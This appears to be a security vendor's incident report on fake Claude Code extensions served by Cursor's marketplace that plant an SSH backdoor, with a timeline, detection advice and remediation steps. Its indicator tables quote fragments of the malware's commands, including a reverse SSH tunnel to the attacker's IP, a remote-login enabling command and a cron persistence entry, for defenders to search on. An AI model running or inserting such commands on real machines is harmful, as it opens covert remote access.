---
id: collect-261121-veille-ia/claude-anthropic/fake-claude-code-extension-in-cursor-how-to-find-the-backdoor
title: "Fake Claude Code extension in Cursor: How to find the backdoor"
domain: claude-anthropic
role: reference
task: article
actors: ["Anthropic"]
dates: []
keywords: ["cursor", "code", "extension", "claude", "backdoor", "fake", "cursors", "october"]
source: https://expel.com/blog/blog-fake-claude-code-extension-cursor-ssh-backdoor/
source_anchor: ""
source_lines: [1, 154]
section: "Claude_Anthropic"
---
*The fake Claude Code extensions (versions 2.1.312 and 2.1.313) are malicious copies of Anthropic’s Claude Code extension that Cursor’s VS Code extension marketplace served on October 29, 2026. Anthropic didn’t build them. They look and work like the real thing, but they try to plant an SSH backdoor on developer machines, and uninstalling them may not remove it.*

## TL;DR

- On October 29, 2026, Cursor’s VS Code extension marketplace served fake Claude Code extensions (versions 2.1.312 and 2.1.313) that try to plant an SSH backdoor on developer machines.
- In one of our four Expel incidents, the first malicious activity came about 8 hours after Cursor’s stated exposure window closed.
- Organizations that only check that 11-hour window could miss infected machines.
- Uninstalling the extension may not remove the backdoor, according to Cursor. The persistence has to be removed separately.

On October 29, 2026, Cursor’s VS Code extension marketplace served fake versions of the Claude Code extension (versions 2.1.312 and 2.1.313) that try to plant an SSH backdoor on developer machines, according to Cursor.

Between October 29 and 30, Expel investigated four incidents tied to this extension at four customers. Each involved one Mac:

- Three ran CrowdStrike Falcon and one ran Microsoft Defender for Endpoint.
- Three started inside Cursor’s stated exposure window.
- One started about 8 hours after it closed.

That means some organizations may be scoping too narrowly.

**Note:**Cursor updated its notice on October 30 to add version 2.1.312 and correct its indicators of compromise. If you pulled file hashes from the original notice, pull them again.

## Key facts

| Fact | Detail | 
|---|---|
| Name | Fake Claude Code extension, versions 2.1.312 and 2.1.313 (not developed by Anthropic) | 
| Type | Software supply chain attack | 
| Distributed via | Cursor’s VS Code extension marketplace (per Cursor) | 
| Exposure window | October 29, 2026, 2:27am–1:35pm PT (about 11 hours) | 
| Platforms targeted | macOS and Windows; Cursor’s indicators also cover Linux. All four Expel cases were Macs. | 
| Payload | Attacker SSH key, reverse SSH tunnel, persistence, host details sent to the attacker | 
| Persistence | **macOS:** A launch agent named to look like an Apple component (com.apple.sysmond.plist)**Windows:** A scheduled task named SysMon**Linux:** A cron entry that runs at rebootBackground scripts retry the tunnel about every 60 seconds. | 
| Survives uninstall | Yes. Cursor says uninstalling “may not be sufficient”; Phorion says it won’t remove the backdoor. | 
| Data collected | Hostname, username, OS, architecture, home folder, working directories, Git email, public IP and environment variable names (per Cursor) | 
| Quick check | SSH key labeled svc-telemetry (per Cursor). Not enough on its own: see below. | 
| Expel finding | In one of four incidents, the first malicious activity came about 8 hours after the window closed. | 

## Indicators of compromise (IOCs)

| Type | Indicator | Note | 
|---|---|---|
| IP | 134.209.82[.]225 | Attacker server. TCP 22 (reverse SSH tunnel), TCP 8099 (beacon). Seen in 4 of 4 Expel incidents. | 
| URL | hxxp://134.209.82[.]225:8099/beacon | HTTP POST of host details (Cursor) | 
| SSH key comment | svc-telemetry | Attacker key added to authorized_keys (Cursor) | 
| SSH key fingerprint | SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk | Attacker’s authorized key (Cursor) | 
| SHA-256 | fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364 | VSIX 2.1.312, macOS (Cursor) | 
| SHA-256 | 3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081 | VSIX 2.1.312, Windows (Cursor) | 
| SHA-256 | 80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c | VSIX 2.1.313, macOS (Cursor) | 
| SHA-256 | 6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731 | VSIX 2.1.313, Windows (Cursor) | 
| SHA-256 | ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15 | Malicious extension.js, both versions (Cursor) | 
| File path (macOS/Linux) | ~/.config/.smt, ~/.config/.smtk | Tunnel script and private key. Seen in Expel incidents. | 
| File path (macOS) | ~/Library/LaunchAgents/com.apple.sysmond.plist | Launch agent persistence (label com.apple.sysmond). Seen in Expel incidents. | 
| File path | $TMPDIR/.stk_<10 hex> (macOS) /tmp/.stk_<10 hex> (Linux) %TEMP%\.stk_<10 hex> (Windows) | Tunnel private key. Seen on 3 of 4 Expel customer Macs. | 
| File path (Windows) | %USERPROFILE%\.config\smt.cmd %USERPROFILE%\.config\smtk | Tunnel script and key (Cursor) | 
| Persistence (Windows) | Scheduled task SysMon; fallback %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd | (Cursor) | 
| Persistence (Linux) | cron @reboot /bin/sh “<HOME>/.config/.smt” | (Cursor) | 
| Command line | ssh -N -R ‘*:0:localhost:22’ … tunnel@134.209.82[.]225 | Reverse SSH tunnel. Seen in 4 of 4 Expel incidents. | 
| Command line | autossh -M 0; systemsetup -setremotelogin on | Tunnel respawn and attempt to turn on remote login (Cursor) | 
| Process behavior | Cursor Helper (Plugin) as parent of systemsetup, launchctl or pgrep -f [t]unnel@ | Seen in 2 of 4 Expel incidents. Should rarely match legitimate activity. | 
| Extension folder | anthropic.claude-code-2.1.312-* or anthropic.claude-code-2.1.313-* | Seen (2.1.313) in 2 of 4 Expel incidents | 

## How does the fake Claude Code extension backdoor work?

Cursor is a popular code editor. Like most editors, it supports extensions, which are add-ons that give it extra features. Claude Code is Anthropic’s AI coding assistant, and many developers install its extension.

On October 29, Cursor’s extension store served two fake versions of that extension, 2.1.312 and 2.1.313. Anthropic didn’t build them. It looked and worked like the real thing while setting up a hidden back door into users’ computers.

The back door had three parts:

- **A spare key:** The malware tries to add the attacker’s SSH key to the user’s list of keys allowed to log in. SSH is a standard way to log in to a computer remotely. Think of it as copying a house key and leaving it under the doormat.
- **A tunnel:** It opens an outbound connection (a reverse SSH tunnel) from the computer to the attacker’s server. Because the connection starts from inside, it can get past firewalls that block incoming traffic. In one of our incidents, the tunnel connected out even when the user wasn’t an admin. According to Cursor, the attacker can only log in through the tunnel if the computer’s remote login feature (SSH) is turned on.
- **Persistence:** On Macs, it installed a launch agent named to look like an Apple component. The launch agent restarts the tunnel when the user logs in, and a background loop retries the connection about every 60 seconds. Windows and Linux machines get their own persistence, per Cursor. Cursor says uninstalling the extension may not remove this.

It also sent details about the computer to the attacker’s server, according to Cursor. These included the hostname, username, Git email, public IP, and the names of environment variables. Phorion, a macOS security firm, says it sent up to 40 variable names that look like keys or tokens, which tells the attacker which machines hold credentials. The values themselves stayed on the machine. Cursor says the malware targets macOS and Windows, and its indicators also cover Linux. Phorion also describes Linux persistence. All four computers in our incidents were Macs.

## When was the fake Claude Code extension live in Cursor?

- **October 29, 2:27am PT (09:27 UTC):** Fake extensions go live in Cursor’s store.
- **October 29, 1:35pm PT (20:35 UTC):** Cursor removes them. The window was about 11 hours.
- **October 29:** Cursor publishes its security notice. Cursor says it worked with the hosting provider to take the attacker’s server offline but doesn’t say when.
- **October 30, 04:45 UTC (about 8 hours after the window closed):** An Expel customer Mac first shows malicious activity.
- **October 30, 14:29 UTC:** The tunnel on that Mac is still connecting out to the attacker’s IP.
- **October 30, 11:30am PT (18:30 UTC):** Cursor updates its notice to add version 2.1.312 and correct its indicators.

## What did Expel see after Cursor’s exposure window closed?

### Malicious activity started after the official window closed

Cursor’s guidance focuses on people who installed between 2:27am and 1:35pm PT on October 29. In one incident, the first malicious activity came at 04:45 UTC on October 30, about 8 hours after the window closed.

The timing fits a download during the window that didn’t run until Cursor next opened. On that Mac, the user logged in at 04:44 UTC, Cursor opened the same minute, and the malicious code ran at 04:45 as Cursor started up. We haven’t confirmed when the extension was downloaded. We have no evidence that Cursor’s store kept serving the fake extension after removing it.

Either way, it only takes one late case to show the point: Organizations that only check that 11-hour window could miss infected machines.

### The back door kept running on its own

On one Mac, the launch agent kept the tunnel connecting out to the attacker’s IP for nearly 10 hours, from 04:45 to 14:29 UTC on October 30. That persistence runs on its own, apart from the extension, so it has to be removed too.

### Cursor says admin rights block the login step on most machines. Don’t count on it

Cursor says the attacker can only log in through the tunnel if remote login (SSH) is turned on, and turning it on takes admin rights. In one of our incidents, the tunnel still connected out on a Mac where the user wasn’t an admin.

According to Cursor, the extension doesn’t have admin rights on most macOS and Windows machines. On those machines, the step fails and the attacker can’t log in through the tunnel. But two caveats matter:

1. **At least one affected user in our incidents was a local admin.**
2. **Remote login may already be on.** Phorion notes that on a Mac where remote login is already on, or gets turned on later, the backdoor is ready to use.

Cursor says the extension still adds the attacker’s key, installs persistence, and sends host details, regardless of admin rights. Don’t assume you’re in the safe majority.

## How did Expel detect the fake Claude Code extension?

Our customers’ endpoint security tools flagged this: CrowdStrike Falcon in three incidents and Microsoft Defender for Endpoint in one. The clues that gave it away:

- The code editor doing things a code editor shouldn’t, like checking remote login settings and creating startup programs
- An outbound SSH connection to an internet server that CrowdStrike threat intel or Microsoft’s Defender Experts had already flagged
- The code editor adding a new key to the user’s list of SSH keys allowed to log in

## Why are attackers targeting developer tools?

This attack came about a week after another developer-tool supply chain attack: LiteLLM, version 1.107.0, on October 21, which Expel also responded to.

Attackers are going after the tools developers trust: extensions, AI coding tools and software packages. In our experience, few organizations track which editor extensions their developers have installed.

## MITRE ATT&CK mapping

| Technique | ID | Behavior | 
|---|---|---|
| Compromise software dependencies and development tools | T1195.001 | Fake editor extensions (2.1.312 and 2.1.313) served in the marketplace | 
| Account manipulation: SSH authorized keys | T1098.004 | Attacker’s SSH key added to the computer | 
| Protocol tunneling | T1572 | Reverse SSH tunnel to the attacker’s server | 
| Create or modify system process: Launch agent | T1543.001 | Persistence that restarts the tunnel at login (macOS) | 
| Masquerading: Match legitimate name or location | T1036.005 | Launch agent named com.apple.sysmond to look like an Apple component (macOS) | 
| System information discovery | T1082 | Collects hostname, username, OS, Git email, public IP, and environment | 
| Remote services: SSH | T1021.004 | Remote login through the tunnel (made possible, not observed) | 
| Application layer protocol: Web protocols | T1071.001 | Host details sent by HTTP POST to the attacker’s server on port 8099 | 
| Scheduled task/job: Scheduled task | T1053.005 | SysMon scheduled task (Windows, per Cursor) | 
| Scheduled task/job: Cron | T1053.003 | Cron entry that runs at reboot (Linux, per Cursor) | 

## How do you check for and remove the fake Claude Code extension?

1. Check whether anyone in your org uses Cursor, and whether they had Claude Code extension versions 2.1.312 or 2.1.313.
2. Don’t stop at the October 29 window. Check every machine that runs Cursor.
3. Use the one-line check and cleanup scripts in Cursor’s security notice. Cursor’s quick test looks for an SSH key labeled svc-telemetry. That check alone can miss infected machines. In one of our incidents, the tunnel was running but we found no attacker key. Also check for:
  - Connections to 134.209.82[.]225 on any port
  - Command lines containing tunnel@134.209.82[.]225, or -R *:0:localhost:22 with StrictHostKeyChecking=no
  - Files named .stk_ followed by 10 hex characters in the macOS temp folder
  - ~/.config/.smt, ~/.config/.smtk and ~/Library/LaunchAgents/com.apple.sysmond.plist
  - Windows and Linux file paths (see the IOC table above)
  - The file hashes in the IOC table above
4. If a machine was affected, disconnect it from the network, clean it up (or rebuild it), and use a different, trusted computer to change any passwords and access keys that were on the affected machine.
5. To check whether anyone logged in, Phorion suggests searching SSH logs for logins from localhost that used the svc-telemetry key.
6. Longer term, keep track of which editor extensions developers install, and consider waiting a few days before allowing brand-new versions.

Cursor says the attacker’s server no longer works. The risk is ongoing for any machine that hasn’t been cleaned up.
